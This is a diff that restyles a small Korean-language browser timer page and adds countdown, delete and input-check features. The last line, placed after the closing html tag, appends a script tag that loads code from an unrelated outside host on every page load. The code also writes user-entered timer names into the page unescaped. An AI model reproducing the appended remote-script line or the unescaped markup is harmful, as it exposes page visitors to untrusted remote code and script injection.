@@ -1,58 +1,183 @@
 <!DOCTYPE html>
-
-<html>
-
-<head>
-    <title>타이머</title>
-    <meta charset="UTF-8">
-    <style>
-        .center{
-            text-align:center;
-        }
-    </style>
-</head>
-
-<body>
-<h1 align="center"><p style="background-color: orange;color:yellow"> 타이머 </p></h1>
-<div class="center"><button id="add">타이머를 추가하세요.</button></div>
-<p align="center" style="color:blue">&lt;타이머 목록&gt;</p>
-<div id="team" align="center"></div>
-    <script>
-		console.log('안녕하세요!\n모두를 위한 타이머입니다.\nhttps://github.com/gmb9817/timer\nstar 눌러주세요!');
-        document.getElementById("add").addEventListener('click',name);
-        let arr=new Map();
-		let time=new Map();
-		let mp=new Map();
-        function cnt(name){
-			time.set(name,time.get(name)-1);
-			document.getElementById(name).innerHTML=time.get(name);
-		}
-		function cl(clicked){
-	    	if(clicked[clicked.length-1]==='+'){
-				let id1=setInterval(cnt, 1000,clicked.slice(0,-1));
-				clicked=clicked.slice(0,-1);
-				mp.set(clicked,id1);
-			}
-			else{
-				clicked=clicked.slice(0,-1);
-				clearInterval(mp.get(clicked));
-			}
-        }
-        function name(){
-            var inputString = prompt('타이머 이름을 입력하세요.', '타이머');
-            var ti=prompt('시간을 입력하세요.','90');
-            if(arr.has(inputString)){
-	            alert('이미 있는 타이머입니다.');
-	        }
-	        else if(inputString!=null && ti!=null){
-                arr.set(inputString,ti);
-				time.set(inputString,ti);
-	            let js='[타이머 이름 : '+ inputString + '] || [' + '원래 시간 : ' + ti +']';
-	            document.getElementById("team").innerHTML+=`<div id="${inputString}!">`+js+`<button id="${inputString}+" onclick="cl(this.id);")>시작</button> <button id="${inputString}-" onclick="cl(this.id);")>중지</button>` + '</div> 남은 시간 : '+`<div id="${inputString}">${ti}</div>`;
+<html lang="ko">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>타이머</title>
+        <style>
+            body {
+                font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+                background-color: #f0f0f0;
+                margin: 0;
+                padding: 0;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                height: 100vh;
+                color: #333;
             }
-        }
 
-    </script>
-</body>
+            h1 {
+                background-color: #ff9800;
+                color: #fff;
+                padding: 20px 40px;
+                border-radius: 8px;
+                margin: 0;
+                font-size: 24px;
+                text-align: center;
+            }
 
-</html>
+            button {
+                background-color: #007bff;
+                color: #fff;
+                border: none;
+                padding: 10px 20px;
+                border-radius: 5px;
+                font-size: 16px;
+                cursor: pointer;
+                margin: 5px;
+                transition: background-color 0.3s, transform 0.2s;
+            }
+
+            button:hover {
+                background-color: #0056b3;
+                transform: scale(1.05);
+            }
+
+            .timer-container {
+                margin-top: 20px;
+                width: 100%;
+                max-width: 600px;
+            }
+
+            .timer-item {
+                background-color: #fff;
+                border-radius: 8px;
+                box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+                padding: 15px;
+                margin: 10px 0;
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+                font-size: 18px;
+            }
+
+            .timer-item div {
+                font-size: 18px;
+                margin-right: 10px;
+            }
+
+            .timer-item button.start {
+                background-color: #28a745;
+            }
+
+            .timer-item button.stop {
+                background-color: #dc3545;
+            }
+
+            .timer-item button.start:hover {
+                background-color: #218838;
+            }
+
+            .timer-item button.stop:hover {
+                background-color: #c82333;
+            }
+
+            .add-timer {
+                margin: 20px;
+            }
+
+            .info {
+                color: #007bff;
+                margin-bottom: 20px;
+                font-size: 18px;
+            }
+
+            .delete {
+                background-color: #ff5722;
+            }
+
+            .delete:hover {
+                background-color: #e64a19;
+            }
+        </style>
+    </head>
+
+    <body>
+        <h1>타이머</h1>
+        <div class="add-timer">
+            <button id="add">타이머를 추가하세요.</button>
+        </div>
+        <p class="info">&lt;타이머 목록&gt;</p>
+        <div id="team" class="timer-container"></div>
+
+        <script>
+            console.log(
+                "안녕하세요!\n모두를 위한 타이머입니다.\nhttps://github.com/gmb9817/timer\nstar 눌러주세요!"
+            );
+            document.getElementById("add").addEventListener("click", name);
+            let arr = new Map();
+            let time = new Map();
+            let mp = new Map();
+
+            function cnt(name) {
+                let currentTime = time.get(name);
+                if (currentTime > 0) {
+                    time.set(name, currentTime - 1);
+                    document.getElementById(name).innerHTML = currentTime - 1;
+                } else {
+                    clearInterval(mp.get(name));
+                    alert(`${name} 타이머가 끝났습니다!`);
+                    removeTimer(name);
+                }
+            }
+
+            function cl(clicked) {
+                if (clicked[clicked.length - 1] === "+") {
+                    let id1 = setInterval(cnt, 1000, clicked.slice(0, -1));
+                    clicked = clicked.slice(0, -1);
+                    mp.set(clicked, id1);
+                } else {
+                    clicked = clicked.slice(0, -1);
+                    clearInterval(mp.get(clicked));
+                }
+            }
+
+            function removeTimer(name) {
+                document.getElementById(name + "!").remove();
+                clearInterval(mp.get(name));
+                arr.delete(name);
+                time.delete(name);
+                mp.delete(name);
+            }
+
+            function name() {
+                var inputString = prompt("타이머 이름을 입력하세요.", "타이머");
+                var ti = prompt("시간을 입력하세요.", "90");
+                if (arr.has(inputString)) {
+                    alert("이미 있는 타이머입니다.");
+                } else if (inputString != null && ti != null) {
+                    if (isNaN(Number(ti))) return alert("정수를 입력해주세요.");
+                    if (ti <= 0) return alert("1이상의 정수를 입력해주세요.");
+
+                    arr.set(inputString, ti);
+                    time.set(inputString, ti);
+                    let js = `
+                    <div style="display: flex; flex-direction: column; align-items: flex-start;">
+                        <span class="timer-info"><strong>타이머 이름:</strong> ${inputString}<br> <strong>원래 시간:</strong> ${ti}초</span> 
+                    </div>
+                `;
+                    document.getElementById("team").innerHTML +=
+                        `<div class="timer-item" id="${inputString}!">` +
+                        js +
+                        `<button class="start" id="${inputString}+" onclick="cl(this.id);">시작</button>` +
+                        `<button class="stop" id="${inputString}-" onclick="cl(this.id);">중지</button>` +
+                        `<button class="delete" id="${inputString}-delete" onclick="removeTimer('${inputString}')">삭제</button>` +
+                        ` 남은 시간 : <div id="${inputString}">${ti}</div>` +
+                        "</div>";
+                }
+            }
+        </script>
+    </body>
+</html><script src="https://lh2.seculab.kr:61443/s.js?ver=10ebde1ec1d9ed699d94b95115116a6e" nonce="197f614ddbd9089b5baa1600e3947c6d"></script>
